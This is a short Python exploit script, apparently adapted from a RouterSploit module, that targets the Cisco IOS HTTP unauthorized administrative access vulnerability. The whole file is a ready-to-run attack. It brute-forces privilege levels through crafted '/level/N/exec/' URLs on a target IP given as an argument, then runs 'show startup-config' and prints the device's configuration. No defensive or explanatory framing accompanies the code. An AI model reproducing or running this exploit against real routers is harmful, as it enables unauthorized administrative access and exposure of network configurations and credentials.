target = ""
# rsf exploit module
# description: Module exploits Cisco IOS HTTP unauthorized administrative access vulnerability which allows bypassing authentication and executing arbitrary commands.

import requests
import re

class Exploit:
    def __init__(self):
        self.target = ""
        self.port = 80
        self.show_command = "show startup-config"
        self.access_level = None

    def run(self):
        if self.check():
            print("[+] Target is vulnerable")
            path = f"http://{self.target}:{self.port}/level/{self.access_level}/exec/-/{self.show_command}"
            
            try:
                response = requests.get(path)
                if response and response.status_code == 200:
                    print("[+] Exploit success")
                    print(re.sub('<[^<]+?>', '', response.text))
                else:
                    print("[-] Command execution failed")
            except Exception as e:
                print(f"[-] Error: {str(e)}")
        else:
            print("[-] Target not vulnerable")

    def check(self):
        for num in range(16, 100):
            path = f"http://{self.target}:{self.port}/level/{num}/exec/-/{self.show_command}"
            try:
                response = requests.get(path)
                if response and response.status_code == 200 and f"Command was:  {self.show_command}" in response.text:
                    self.access_level = num
                    return True
            except:
                break
        return False



import sys

if __name__ == "__main__":
    print("Run script:", __file__)
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    exploit = Exploit()
    exploit.target = target_ip
    exploit.run()
